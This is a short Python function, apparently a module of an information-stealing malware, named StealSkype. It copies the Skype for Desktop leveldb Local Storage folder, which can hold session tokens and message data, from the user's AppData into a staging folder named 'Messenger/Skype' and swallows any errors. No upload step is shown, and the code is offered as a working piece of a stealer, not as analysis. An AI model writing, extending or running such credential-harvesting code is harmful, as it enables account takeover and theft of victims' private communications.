import os
import shutil


async def StealSkype(self, directory_path: str) -> None:
    try:
        skype_folder = os.path.join(self.appdata, "Microsoft", "Skype for Desktop", "Local Storage", "leveldb")
        if os.path.exists(skype_folder):
            copy_path = os.path.join(directory_path, "Messenger", "Skype")
            os.makedirs(copy_path, exist_ok=True)
            if os.path.isdir(skype_folder):
                shutil.copytree(skype_folder, copy_path, dirs_exist_ok=True)
            else:
                shutil.copyfile(skype_folder, copy_path)
            
            if len(os.listdir(copy_path)) == 0:
                os.rmdir(copy_path)
            
    except Exception as e:
        print(f"skype error - {str(e)}")
        pass